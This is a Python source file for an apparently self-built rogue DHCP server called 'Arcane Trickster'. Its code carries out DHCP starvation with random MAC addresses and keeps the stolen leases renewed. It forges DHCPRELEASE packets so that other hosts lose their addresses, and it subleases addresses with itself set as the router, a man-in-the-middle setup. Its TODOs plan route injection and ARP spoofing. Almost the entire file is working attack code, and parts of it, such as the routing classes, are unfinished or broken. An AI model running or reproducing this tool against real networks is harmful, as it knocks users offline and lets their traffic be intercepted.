from scapy.all import *
from threading import Thread, Event, get_ident
from queue import Queue, Empty
from ipaddress import IPv4Network, IPv4Address
from functools import lru_cache
from enum import Enum, auto
import math
import random
import time
import select
import socket
import fcntl
import argparse
arg_parser = argparse.ArgumentParser(
                    prog='Arcane Trickster',
                    description="""Rogue DHCP Server: DHCP Starvation, DHCP Hijacking,
                    Ma\'am-in-the Middle DHCP Subleasing(LANlady)'""",
                    epilog='Text at the bottom of help')
import logging
logging.basicConfig(format='%(asctime)s - %(name)s(%(thread)d) [%(levelname)s] %(message)s', level=logging.INFO)

# https://stackoverflow.com/questions/6067405/python-sockets-enabling-promiscuous-mode-in-linux
import ctypes

class ifreq(ctypes.Structure):
    _fields_ = [("ifr_ifrn", ctypes.c_char * 16),
                ("ifr_flags", ctypes.c_short)]


def random_mac():
    mac = random.randint(0, 2**48-1)

    # Set the broadcast bit
    if not mac & 2**40:
        mac ^= 2**40

    mac = hex(mac)[2:].zfill(12)
    return f'{mac[:2]}:{mac[2:4]}:{mac[4:6]}:{mac[6:8]}:{mac[8:10]}:{mac[10:12]}'


def binary_search_list(in_list: list, value: object, key: 'FunctionType'=lambda item: item, fuzzy: bool=False) -> int:
    """
    Performs binary search for `value` on a sorted `in_list` with key selector `key`.

    Parameters:
        in_list (list): Sorted list to search.
        value (object): Value to search for.
        key     (func): Function that takes in an item and returns the key to search over.

    Returns:
        int: Index of value.
    """
    start_range = 0
    end_range   = len(in_list)

    if not end_range or value > key(in_list[-1]):
        if fuzzy:
            return end_range
        else:
            raise IndexError("Item not in list")


    if value < key(in_list[0]):
        if fuzzy:
            return start_range
        else:
            raise IndexError("Item not in list")

    curr     = -1
    fuzz_mod = 0
    while end_range - 1 != start_range:
        curr = (end_range - start_range) // 2 + start_range
        item = key(in_list[curr])

        if item == value:
            return curr
        elif item < value:
            start_range = curr
            fuzz_mod    = 1
        else:
            end_range = curr
            fuzz_mod  = 0

    # Special case since at zero, end_range - 1 == start_range
    if key(in_list[0]) == value:
        return 0

    if fuzzy:
        return curr + fuzz_mod
    else:
        raise IndexError("Item not in list")


def api(func):
    def _wrapper(self, *args, **kwargs):
        self.mailbox.put((func, args, kwargs))

    return _wrapper


class BaseObject(object):

    @property
    @lru_cache(1)
    def log(self):
        return logging.getLogger(self.__class__.__name__)


class ThreadedWorker(BaseObject):
    def __init__(self) -> None:
        self.mailbox     = Queue()
        self.event       = Event()
        self.thread      = Thread(target=self._run, daemon=True)
        self.thread.start()
        self.__init_loops()


    def __del__(self):
        '''Function used by python internals when object is deleted.'''
        self.close()


    def close(self):
        self.event.set()


    @api
    def sleep(self, sleep_time):
        time.sleep(sleep_time)


    @api
    def _set(self, name, value):
        object.__setattr__(self, name, value)


    def __init_loops(self):
        for attr_name in dir(self):
            attr = getattr(self, attr_name)
            if callable(attr):
                if hasattr(attr, '_loop_init'):
                    attr._loop_init(self)
                
                if hasattr(attr, '_sub_init'):
                    event_man, event = attr._sub_init
                    event_man.subscribe(event, attr)


    def __setattr__(self, name: str, value: object) -> None:
        # Fixes the race condition in initialization
        if hasattr(self, "thread") and get_ident() != self.thread.ident:
            self._set(name, value)
        else:
            object.__setattr__(self, name, value)


    def _run(self):
        while not self.event.is_set():
            try:
                func, args, kwargs = self.mailbox.get(timeout=150e-3)
                func(self, *args, **kwargs)
            except Empty:
                pass


class TimerManager(ThreadedWorker):
    def __init__(self) -> None:
        self.timers = []
        super().__init__()


    def add_timer(self, sleep_time, callback, sig):
        self.timers.append((time.time() + sleep_time, callback, sig))
        self.timers.sort(key=lambda item: item[0])


    def _run(self):
        while not self.event.is_set():
            time.sleep(1e-3)
            idx = binary_search_list(self.timers, time.time(), key=lambda item: item[0], fuzzy=True)

            for _, callback, (s, args, kwargs) in self.timers[:idx]:
                callback(s, *args, **kwargs)

            del self.timers[:idx]


_timer_man = TimerManager()

def loop(sleep_time):
    def _outwrapper(func):
        api_func = api(func)

        def _wrapper(self, *args, **kwargs):
            api_func(self, *args, **kwargs)
            _timer_man.add_timer(sleep_time, _wrapper, (self, args, kwargs))

        # Initialize the loop
        api_func._loop_init = _wrapper
        return api_func

    return _outwrapper


class EventManager(ThreadedWorker):
    def __init__(self):
        self.subscriptions = {}
        super().__init__()
    

    @api
    def subscribe(self, event: Enum, callback):
        if not event in self.subscriptions:
            self.subscriptions[event] = []

        self.log.info(f"Appending callback for {event}")
        self.subscriptions[event].append(callback)

    @api
    def trigger_event(self, event: Enum, *args, **kwargs):
        if not event in self.subscriptions:
            self.subscriptions[event] = []
        
        self.log.info(f"Event occurred: {event} {args}")
        for subscriber in self.subscriptions[event]:
            subscriber(*args, **kwargs)


_event_man = EventManager()

def trigger_event(event: Enum, *args, **kwargs):
    _event_man.trigger_event(event, *args, **kwargs)


def on_event(event: Enum):
    def _wrapper(func):
        func._sub_init = (_event_man, event)
        return func

    return _wrapper


class NetworkInterfaceEvent(Enum):
    READ = auto()


class NetworkInterface(ThreadedWorker):
    '''This class creates a virtual network interface and a non-binding socket. 
        It uses a subscriber model to enable multi-threading.
    '''

    def __init__(self, name: str) -> None:
        self.name   = name
        # Create Socket and bind it
        self.socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
        self.socket.bind((self.name, 0x0800))
        # Set socket to non-binding to allow for multi-threading without lockup
        self.socket.setblocking(0)
        self.enter_promiscious_mode()

        self.arp_table = ARPTable(self)
        super().__init__()


    def enter_promiscious_mode(self):
        IFF_PROMISC  = 0x100
        SIOCGIFFLAGS = 0x8913
        SIOCSIFFLAGS = 0x8914

        ifr = ifreq()
        ifr.ifr_ifrn = self.name.encode('utf-8')
        fcntl.ioctl(self.socket.fileno(), SIOCGIFFLAGS, ifr)
        ifr.ifr_flags |= IFF_PROMISC
        fcntl.ioctl(self.socket.fileno(), SIOCSIFFLAGS, ifr)


    @property
    def mac_address(self):
        '''
        Returns the scapy MAC address.
        '''
        return get_if_hwaddr(self.name)


    @property
    def ip_address(self):
        '''
        Return the scapy IP address 
        '''
        return get_if_addr(self.name)


    @property
    def subnet_mask(self):
        for net, msk, gw, iface, addr, metric in conf.route.routes:
            if iface == self.name:
                network = IPv4Network(f"{ltoa(net)}/{ltoa(msk)}")
                if IPv4Address(self.ip_address) in network:
                    return ltoa(msk)


    @property
    def network(self):
        return IPv4Network(f"{self.ip_address}/{self.subnet_mask}", strict=False)


    def close(self):
        ''' Sets Event flag to break while loop in _run() function. 
            Closes the socket and has the thread for the 
            network interface rejoin main python thread.
        '''
        self.event.set()
        self.socket.close()
        self.thread.join()


    def send(self, data: bytes):
        '''Sends data in bytes over the socket.'''
        self.socket.send(bytes(data))


    def _run(self):
        while not self.event.is_set():
            r, _w, _err = select.select([self.socket], [], [], 1e-5)

            if self.socket in r:
                data = self.socket.recv(4 * 1024)
                trigger_event(NetworkInterfaceEvent.READ, Ether(data))



class DHCPLeaseGenerator(BaseObject):
    def __init__(self) -> None:
        self.claimed    = {}
        self.mac_ip_map = {}


    def renew(self, ip_address: str):
        if ip_address in self.claimed:
            old_lease, expiration, mac_address = self.claimed[ip_address]

            # Make sure that they actually have the IP
            if ip_address == self.mac_ip_map.get(mac_address, "DNE"):
                if time.time() > expiration:
                    for lease in reversed(self.leases):
                        if hash(lease) == hash(old_lease):
                            self.log.debug(f"Renewing lease {repr(lease)}")
                            old_lease.renew(lease)
                            return lease
                else:
                    return old_lease

        raise DHCPLeaseExpiredException(ip_address)


    def claim(self, mac_address: str):
        for lease in reversed(self.leases):
            # Release it first if it expired
            if lease.ip_address in self.claimed:
                old_lease, expiration, mac_address = self.claimed[lease.ip_address]

                if time.time() > expiration:
                    self.release(old_lease.ip_address)
                else:
                    continue


            if lease.is_expired:
                raise DHCPLeasePoolExhaustedException("Expired lease in renewal list")

            # Handle claims
            self.claimed[lease.ip_address] = (lease, lease.expiration, mac_address)
            self.mac_ip_map[mac_address]   = lease.ip_address
            self.log.debug(f"Claiming lease {repr(lease)}")
            return lease

        raise DHCPLeasePoolExhaustedException


    def release(self, ip_address: str=None):
        self.log.debug(f"Releasing lease {repr(ip_address)}")
        del self.claimed[ip_address]


class DHCPLease(object):
    def __init__(self, mac_address: str, ip_address: str, server_mac: str, server_ip: str, options: list, duration: int) -> None:
        self.mac_address = mac_address
        self.ip_address  = ip_address
        self.server_mac  = server_mac
        self.server_ip   = server_ip
        self.options     = options
        self.duration    = duration
        self.start_time  = time.time()


    def __repr__(self):
        return f"<DHCPLease mac_address={self.mac_address}, ip_address={self.ip_address}, server_mac={self.server_mac}, server_ip={self.server_ip}, options={self.options}, expiration={self.expiration}>"


    def __eq__(self, other):
        return (self.mac_address, self.ip_address, self.server_mac, self.server_ip) == (other.mac_address, other.ip_address, other.server_mac, other.server_ip)        

    def __hash__(self):
        return hash((self.mac_address, self.ip_address, self.server_mac, self.server_ip))


    @property
    def expiration(self):
        return self.start_time + self.duration

    @property
    def is_expired(self):
        return self.expiration < time.time()

    def renew(self, lease: 'DHCPLease'):
        self.start_time = lease.start_time
        self.duration   = lease.duration
        self.options    = lease.options


    def build_packet_base(self, op, xid: int=None, siaddr: int=None, ciaddr: int=None, secs: int=0, src_ip: str=None, dst_mac: str=None, dst_ip: str=None, yiaddr: str=None, chaddr: str=None):
        if op == 1:
            sport, dport = 68, 67
        else:
            sport, dport = 67, 68

        mac_bytes = int.to_bytes(int((chaddr or self.mac_address).replace(":", ""), 16), 6, 'big')
        packet    = Ether(dst=dst_mac or self.server_mac, src=self.mac_address, type=0x0800) \
            / IP(src=src_ip or self.ip_address, dst=dst_ip or self.server_ip) \
            / UDP(dport=dport, sport=sport) \
            / BOOTP(op=op, secs=secs, chaddr=mac_bytes, xid=xid or random.randint(0, 2**32-1), 
                    siaddr=siaddr or '0.0.0.0', ciaddr=ciaddr or '0.0.0.0', yiaddr=yiaddr or '0.0.0.0',
                    flags="B")

        return packet 


    def build_discover_packet(self, xid=None):
        return self.build_packet_base(1, xid) / DHCP(options=[("message-type", "discover"), ("requested_addr", self.ip_address), ("end")])


    def build_request_packet(self, xid):
        return self.build_packet_base(1, xid) / DHCP(options=[("message-type", "request"), ("requested_addr", self.ip_address), ("server_id", self.server_ip), ("end")])


    def build_renewal_packet(self, xid=None):
        return self.build_packet_base(1, xid, ciaddr=self.ip_address, secs=1) / DHCP(options=[("message-type", "request"), ("end")])


    def build_ack_packet(self, xid, dst_mac, dst_ip, siaddr, yiaddr, src_ip, ciaddr='0.0.0.0'):
        options = [opt for opt in self.options if opt[0] not in ("server_id",)]
        return self.build_packet_base(2, xid, dst_mac=dst_mac, dst_ip=dst_ip, src_ip=src_ip, siaddr=siaddr, chaddr=dst_mac, yiaddr=yiaddr, ciaddr=ciaddr) / DHCP(options=[("message-type", "ack"), ("server_id", siaddr), *options, ("end")])


    def build_nak_packet(self, xid, dst_mac, dst_ip, src_ip):
        return self.build_packet_base(2, xid, dst_mac=dst_mac, dst_ip=dst_ip, src_ip=src_ip, chaddr=dst_mac) / DHCP(options=[("message-type", "nak"), ("end")])


    def build_offer_packet(self, xid, dst_mac, dst_ip, siaddr, yiaddr):
        options = [opt for opt in self.options if opt[0] not in ("server_id",)]
        return self.build_packet_base(2, xid, dst_mac=dst_mac, dst_ip=dst_ip, siaddr=siaddr, yiaddr=yiaddr, chaddr=dst_mac) / DHCP(options=[("message-type", "offer"), ("server_id", siaddr), *options, ("end")])


    def build_release_packet(self):
        return self.build_packet_base(1) / DHCP(options=[("message-type", "release"), ("end")])


class DHCPLeaseCollectorEvent(Enum):
    NEW_LEASE = auto()

class DHCPLeaseRenewerEvent(Enum):
    NEW_XID = auto()

class DHCPReleaseEvent(Enum):
    LEASE_RELEASED = auto()


class DHCPLeaseCollector(ThreadedWorker):
    def __init__(self, interface: NetworkInterface) -> None:
        self.interface        = interface
        self.server_ip        = None
        self.server_mac       = None
        self.recent           = set()
        self.virtual_clients  = {}
        self.xid_map          = {}
        super().__init__()


    @on_event(DHCPLeaseRenewerEvent.NEW_XID)
    @api
    def handle_external_xid(self, xid, mac):
        self.xid_map[xid] = mac


    @on_event(NetworkInterfaceEvent.READ)
    @api
    def handle_offer_callback(self, data):
        if DHCP in data and data[BOOTP].xid in self.xid_map:
            self.log.debug(f"Creating lease: MAC {data.dst} IP {data[BOOTP].yiaddr} Options {data[DHCP].options}")

            # Grab server info on first packet
            if not self.server_ip:
                self.server_ip  = data[IP].src
                self.server_mac = data.src


            mac = self.xid_map[data[BOOTP].xid]
            del self.xid_map[data[BOOTP].xid]

            lease = DHCPLease(
                mac,
                data[BOOTP].yiaddr,
                data.src,
                data[BOOTP].siaddr,
                [(k,v) for k,v in data[DHCP].options[:-1] if k != "message-type"],
                dict(data[DHCP].options[:-1])['lease_time']
            )

            self.virtual_clients[mac] = lease

            trigger_event(DHCPLeaseCollectorEvent.NEW_LEASE, lease)
            self.interface.send(lease.build_request_packet(data[BOOTP].xid))


    @on_event(DHCPReleaseEvent.LEASE_RELEASED)
    @loop(0.5)
    def _loop(self):
        xid   = random.randint(0, 2**32-1)
        lease = None
        if len(self.virtual_clients) < self.interface.network.num_addresses:
            mac = random_mac()
            self.virtual_clients[mac] = None
        else:
            # Look for virtual clients with expired leases
            found = False
            for mac, lease in self.virtual_clients.items():
                if not lease or lease.is_expired:
                    found = True
                    break

            if not found:
                return


            # Let the lease ask for the same IP if possible
            if lease:
                packet = lease.build_discover_packet(xid=xid)
            else:
                mac_bytes = int.to_bytes(int(mac.replace(":", ""), 16), 6, 'big')
                packet    = Ether(dst="ff:ff:ff:ff:ff:ff", src=mac, type=0x0800) \
                    / IP(src="0.0.0.0", dst="255.255.255.255") \
                    / UDP(dport=67, sport=68) \
                    / BOOTP(op=1, chaddr=mac_bytes, xid=xid) \
                    / DHCP(options=[("message-type", "discover"), ("end")])

            self.xid_map[xid] = mac
            self.interface.send(packet)


class DHCPLeaseRenewer(ThreadedWorker):
    def __init__(self, interface: NetworkInterface) -> None:
        self.interface = interface
        self.leases    = []
        self.pending   = {}
        self.queue     = Queue()
        super().__init__()


    @on_event(DHCPLeaseCollectorEvent.NEW_LEASE)
    @api
    def lease_callback(self, lease: DHCPLease):
        self.queue.put(lease)


    def handle_new_leases(self):
        while self.queue.not_empty:
            # This literally happened. Don't delete
            try:
                lease = self.queue.get_nowait()
            except Empty:
                break

            # Handle lease renewal
            if lease in self.pending:
                self.pending[lease].renew(lease)
                del self.pending[lease]
            else:
                self.leases.append(lease)

            self.leases.sort(key=lambda lease: lease.expiration)


    def renew_leases(self):
        # Renew leases about to be expired
        renewal_boundary = binary_search_list(self.leases, time.time() + 30, key=lambda lease: lease.expiration, fuzzy=True)
        expired_leases   = []

        for lease in self.leases[:renewal_boundary]:
            xid = random.randint(0, 2**32-1)
            if lease.is_expired:
                expired_leases.append(lease)
                trigger_event(DHCPLeaseRenewerEvent.NEW_XID, xid, lease.mac_address)
                self.interface.send(lease.build_discover_packet(xid))
            else:
                # Don't try to renew if it's already pending
                if lease not in self.pending:
                    self.log.debug(f"Renewing lease {repr(lease)}")

                    self.pending[lease] = lease
                    trigger_event(DHCPLeaseRenewerEvent.NEW_XID, xid, lease.mac_address)
                    self.interface.send(lease.build_renewal_packet(xid))

        # Prune expired leases
        for lease in expired_leases:
            idx = binary_search_list(self.leases, lease.expiration, key=lambda lease: lease.expiration)
            del self.leases[idx]

            self.log.debug(f"Deleting expired lease {repr(lease)}")


    def _run(self):
        while not self.event.is_set():
            time.sleep(5)
            self.handle_new_leases()
            self.renew_leases()


class DHCPLeasePoolExhaustedException(Exception):
    pass

class DHCPLeaseExpiredException(Exception):
    pass


class DHCPRangeLeaser(DHCPLeaseGenerator):
    def __init__(self, interface: NetworkInterface, ip_address_start: IPv4Address, ip_address_stop: IPv4Address, **options) -> None:
        self.interface        = interface
        self.ip_address_start = ip_address_start
        self.ip_address_stop  = ip_address_stop
        self.options          = options
        self.options.update({
            'router': options.get('router', interface.ip_address),
            'subnet_mask': options.get('subnet_mask', interface.subnet_mask),
            'lease_time': options.get('lease_time', 60)
        })
        super().__init__()

        lease_range  = range(int.from_bytes(self.ip_address_start.packed, 'big'), int.from_bytes(self.ip_address_stop.packed, 'big')+1)
        self._leases = [DHCPLease(random_mac(), str(IPv4Address(ip_int)), interface.mac_address, interface.ip_address, list(self.options.items()), self.options['lease_time']) for ip_int in lease_range]


    @property
    def leases(self):
        if (self._leases[0].expiration - (self.options['lease_time'] // 2)) < time.time():
            for lease in self._leases:
                lease.start_time = time.time()
        
        return self._leases



class DHCPSubleaser(DHCPLeaseGenerator):
    def __init__(self, interface: NetworkInterface) -> None:
        self.renewer   = DHCPLeaseRenewer(interface)
        self.collector = DHCPLeaseCollector(interface)
        self.interface = interface
        self.claimed   = {}


    @property
    def leases(self):
        return self.renewer.leases


class ARPTable(ThreadedWorker):
    def __init__(self, interface: NetworkInterface, sweep_time: int=30) -> None:
        self.interface  = interface
        self.table      = {}
        self.sweep_time = sweep_time
        super().__init__()
    

    def __getitem__(self, ip: str):
        return self.table[ip]


    def _run(self):
        while not self.event.is_set():
            sleep_time = self.sweep_time / self.interface.network.num_addresses
            for ip in self.interface.network:
                time.sleep(sleep_time)
                request = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=str(ip))
                self.interface.send(request)


    @on_event(NetworkInterfaceEvent.READ)
    @api
    def handle_packet(self, packet):
        if ARP in packet:
            self.arp_table[packet.psrc] = packet.hwsrc


class DHCPReleaser(ThreadedWorker):
    def __init__(self, interface: NetworkInterface, lease_generator: DHCPLeaseGenerator, server_ip: str, server_mac: str=None, sweep_time: int=30) -> None:
        self.interface       = interface
        self.lease_generator = lease_generator
        self.server_ip       = server_ip
        self.server_mac      = server_mac or self.interface.arp_table[self.server_ip]
        self.sweep_time      = sweep_time
        super().__init__()


    def _run(self):
        # We sleep 1 seconds per sweep to make CPU usage negigible when we own all leases
        # while also adding negigible delay between sweeps. One second was also purposefully
        # chosen to be greater than the DHCPLeaseCollector's iteration time. This gives the
        # collector time to take those IP addresses.

        # By not sleeping when encountering IPs on leases we own, we ensure that the
        # sweep time of each iteration decreases as we steal leases. This effectively
        # fixes the pacing of the packets in exchange for convergence
        while not self.event.is_set():
            sleep_time = self.sweep_time / self.interface.network.num_addresses
            time.sleep(0.25)

            for ip in self.interface.network:
                # It's not us, and we didn't assign it. Get 'em bois
                if str(ip) not in self.lease_generator.claimed and str(ip) != self.interface.ip_address:
                    time.sleep(sleep_time)
                    mac = self.interface.arp_table[str(ip)]
                    self.log.info(f"Releasing {ip} for {mac}")

                    lease = DHCPLease(
                        mac_address=mac,
                        ip_address=str(ip),
                        server_mac=self.server_mac,
                        server_ip=self.server_ip,
                        options=[],
                        duration=0
                    )
                    self.interface.send(lease.build_release_packet())
                    trigger_event(DHCPReleaseEvent.LEASE_RELEASED, lease)



class DHCPServer(ThreadedWorker):
    def __init__(self, interface: NetworkInterface, lease_generator: DHCPLeaseGenerator) -> None:
        self.lease_generator = lease_generator
        self.interface       = interface


    def __repr__(self):
        return f"<DHCPServer: interface={self.interface.name}, num_leases={self.num_leases}, num_claimed={len(self.lease_generator.claimed)}>"


    @property
    def num_leases(self):
        return len(self.lease_generator.leases)


    @on_event(NetworkInterfaceEvent.READ)
    @api
    def handle_packet(self, packet):
        if DHCP in packet:
            if not ("message-type", 2) in packet[DHCP].options and not ("message-type", 5) in packet[DHCP].options:
                print(packet[DHCP].options)
            self.handle_dhcp_discover(packet)
            self.handle_dhcp_request(packet)


    def handle_dhcp_discover(self, packet):
        if ("message-type", 1) in packet[DHCP].options:
            self.log.info(f"Handling DHCPDISCOVER for {packet.src}")

            packet.show()

            if packet[IP].src == "0.0.0.0":
                dst_ip = "255.255.255.255"
                ip     = self.lease_generator.mac_ip_map.get(packet.src, "DNE")
            else:
                dst_ip = packet[IP].src
                ip     = dst_ip


            # Give them their current IP if we have it
            if ip in self.lease_generator.claimed:
                lease = self.lease_generator.renew(ip)
            else:
                lease = self.lease_generator.claim(packet.src)


            self.log.info(f"Offering {lease.ip_address} to {packet.src}")

            self.interface.send(lease.build_offer_packet(xid=packet[BOOTP].xid, dst_ip=dst_ip, dst_mac=packet.src, siaddr=self.interface.ip_address, yiaddr=lease.ip_address))


    def handle_dhcp_request(self, packet):
        if ("message-type", 3) in packet[DHCP].options:
            self.log.info(f"Handling DHCPREQUEST for {packet.src}")

            packet.show()

            if packet[IP].src == "0.0.0.0":
                if packet[BOOTP].ciaddr == '0.0.0.0':
                    lease_ip = [opt for opt in packet[DHCP].options if opt[0] == "requested_addr"][0][1]
                else:
                    lease_ip = packet[BOOTP].ciaddr
            else:
                lease_ip = packet[IP].src

            try:
                lease = self.lease_generator.renew(lease_ip)
                self.log.info(f"Sending lease for {lease.ip_address} to {packet.src}")

                ack = lease.build_ack_packet(xid=packet[BOOTP].xid, dst_ip=packet[IP].src, dst_mac=packet.src, siaddr=self.interface.ip_address, yiaddr=lease.ip_address, ciaddr=packet[BOOTP].ciaddr, src_ip=self.interface.ip_address)
                ack.show()
                self.interface.send(ack)

            except DHCPLeaseExpiredException:
                self.log.info(f"Sending DHCPNAK to {packet.src}")
                nak = self.lease_generator.leases[0].build_nak_packet(xid=packet[BOOTP].xid, dst_ip=packet[IP].src, dst_mac=packet.src, src_ip=self.interface.ip_address)
                nak.show()
                self.interface.send(nak)


class NAT(object):
    def __call__(self, packet):
        return packet


class NoMatchingRouteException(Exception):
    pass


class RoutingTable(BaseObject):
    def __init__(self) -> None:
        self.routes = []
    
    def add(self, network: IPv4Network, hop: IPv4Address, interface: NetworkInterface):
        self.routes.append(IPv4Network(network), hop, interface)
        self.routes.sort(key=lambda route: route[0].num_addresses)


    def __getitem__(self, destination_ip):
        return self.match(destination_ip)


    def match(self, destination_ip: IPv4Address):
        for network, hop, interface in self.routes:
            if destination_ip in network:
                return network, hop, interface

        raise NoMatchingRouteException


    def send(self, packet):
        try:
            _net, hop, interface = self[packet[IP].src]
            packet.src = interface.mac_address
            packet.dst = interface.arp_table[hop]
            interface.send(packet)
        except NoMatchingRouteException:
            self.log.info(f"No matching route; packet ({packet[IP].src}) -> ({packet[IP].dst}) dropped")


class Router(object):
    def __init__(self, interfaces: 'List[NetworkInterface]', routes: RoutingTable=None, translator: NAT=None) -> None:
        self.interfaces  = interfaces
        self.routes      = routes or RoutingTable()
        self.translator  = translator or NAT()
        self.subscribers = [interface.subscribe(self.handle_packet) for interface in interfaces]


    def handle_packet(self, packet):
        self.routes.send(self.translator(packet))


eth0 = NetworkInterface("eth0")
# enp0s3 = NetworkInterface("enp0s3")
# enp0s8 = NetworkInterface("enp0s8")
#server = DHCPServer(enp0s3, DHCPSubleaser(enp0s3))
#server = DHCPServer(enp0s3, DHCPRangeLeaser(enp0s3, IPv4Address("10.10.10.10"), IPv4Address("10.10.10.239"), routes=[]))
server = DHCPServer(eth0, DHCPSubleaser(eth0))
#releaser = DHCPReleaser(enp0s3, server.lease_generator, '10.10.10.1')

eth0.thread.join()
# router = Router([enp0s3, enp0s8])
# router.routes.add("192.168.1.0/24", None, enp0s8)
# router.routes.add("10.10.10.0/24", None, enp0s3)


# TODO Add functionality to intercept a DHCPOFFER and inject our own routes.
# TODO Add functionlity to check if a DHCPREQUEST is unicast
# TODO Add NetworkAddressTranslation functionality, we hoard leases then hand them out

# TODO DHCPServer Class
# TODO DHCPLeaseGenerator Class
# TODO Router Class (NAT)
    # The Real Router
    # Subscriber to listen for relevant packets to the virtual Router
# TODO ARP Spoof

# TODO (not priority) Storage
            # Export PCAP
